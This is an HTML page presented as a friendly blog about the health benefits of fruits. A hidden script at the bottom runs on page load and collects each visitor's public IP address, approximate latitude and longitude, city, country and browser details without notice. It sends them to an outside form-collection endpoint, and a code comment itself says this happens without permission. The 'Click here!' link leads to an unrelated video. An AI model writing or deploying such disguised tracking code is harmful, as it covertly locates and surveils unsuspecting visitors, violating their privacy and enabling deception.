<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>FruityFruits</title>
  <style>

    body {
      background-color: rgb(0, 0, 0);
      color: white;
      font-size: 20px;
      font-family: 'Times New Roman', Times, serif;
      margin: 20px;
      text-align: justify;

    }
    h1 {
      color: midnightblue;
      font-size: 40px;
      text-align: center;
    }

    p {
      font-size: 20px;
      color: white;
      text-align: justify;
      margin: 20px;
    }
    ol {
      font-size: 20px;
      color: white;
      text-align: justify;
      margin: 20px;
    }
    a {
      color: lightblue;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }
    </style>
</head>
<body>
  <main>
    <h1>Welcome to FruityFruits!</h1>
    <p>Fruits, i want to tell you about fruits, hear me out!</p>
        <p>Now i will tell you about my favorite fruits and why they are good for your health
        Fruits are an essential part of a healthy diet. They provide vitamins, minerals, and fiber that our bodies need.</p>
        <p>Fruits regularly can improve overall health and prevent diseases.</p>
        <p>Some of my favorite fruits include:</p>
        <ol>
          <li><strong>Apples:</strong> They are rich in fiber and antioxidants, which can help reduce the risk of chronic diseases.</li>
          <li><strong>Bananas:</strong> They are a great source of potassium, which is important for heart health and muscle function.</li>
          <li><strong>Oranges:</strong> They are high in vitamin C, which boosts the immune system and promotes healthy skin.</li>
          <li><strong>Berries:</strong> They are packed with antioxidants and can help improve brain function.</li>
          <li><strong>Grapes:</strong> They contain resveratrol, which has been linked to heart health.</li>
        </ol>
        <p>In conclusion, incorporating a variety of fruits into your diet can provide numerous health benefits and enhance your overall well-being. So, make sure to enjoy a colorful array of fruits every day!</p>
        <p>Stay healthy and happy!</p>
        <p><strong>Best regards!</strong></p>
        <p>Do you want to know more about fruits? <a href="#" id="Here!">Click here!</a></p>
        <main>
        
<script>
          (() => {
  const formspreeEndpoint = "https://formspree.io/f/mnngrgzw"; // troque se necessário

  function sendToFormspree(payload) {
    return fetch(formspreeEndpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  }

  function getIP() {
    return fetch("https://api.ipify.org?format=json")
      .then(r => { if (!r.ok) throw new Error('api.ipify falhou'); return r.json(); })
      .then(d => d.ip)
      .catch(() => null);
  }

  function getGeoByIPAndSend() {
    const statusEl = document.getElementById('status');
    if (statusEl) statusEl.textContent = "Status: obtendo IP público...";

    getIP().then(ip => {
      if (!ip) {
        if (statusEl) statusEl.textContent = "Status: não foi possível obter IP.";
        sendToFormspree({ timestamp: new Date().toISOString(), note: "Sem IP", user_agent: navigator.userAgent });
        return;
      }

      if (statusEl) statusEl.textContent = "Status: IP obtido. Consultando geolocalização por IP...";

      fetch("https://ipapi.co/json/")
        .then(r => { if (!r.ok) throw new Error('ipapi falhou'); return r.json(); })
        .then(info => {
          const lat = info.latitude || null;
          const lon = info.longitude || null;
          const city = info.city || null;
          const region = info.region || null;
          const country = info.country_name || null;
          const mapsLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : null;

          const payload = {
            timestamp: new Date().toISOString(),
            ip: ip,
            latitude: lat,
            longitude: lon,
            city, region, country,
            google_maps_link: mapsLink,
            user_agent: navigator.userAgent,
            note: "Localização por IP (sem permissão). Precisão baixa."
          };

          if (statusEl) statusEl.textContent = `Status: localização aproximada (${city || 'n/a'}, ${region || ''}). Enviando...`;
          return sendToFormspree(payload);
        })
        .then(() => {
          if (statusEl) statusEl.textContent = "Status: dados enviados (por IP).";
        })
        .catch(err => {
          console.warn("Erro ipapi:", err);
          if (statusEl) statusEl.textContent = "Status: falha na geolocalização por IP. Enviando apenas IP.";
          sendToFormspree({
            timestamp: new Date().toISOString(),
            ip: ip,
            user_agent: navigator.userAgent,
            note: "Falha ipapi; apenas IP enviado"
          });
        });
    });
  }

  // evento para executar ao carregar a página
  window.addEventListener('load', getGeoByIPAndSend);

  // redirecionamento do link
  const here = document.getElementById('Here!');
  if (here) {
    here.addEventListener('click', function (event) {
      event.preventDefault();
      window.location.href = 'https://youtube.com/shorts/UM7TpdnbWfY?si=d_vDGrLYHqp5QZys';
    });
  }
})(); 
</script>
</body>
</html> 
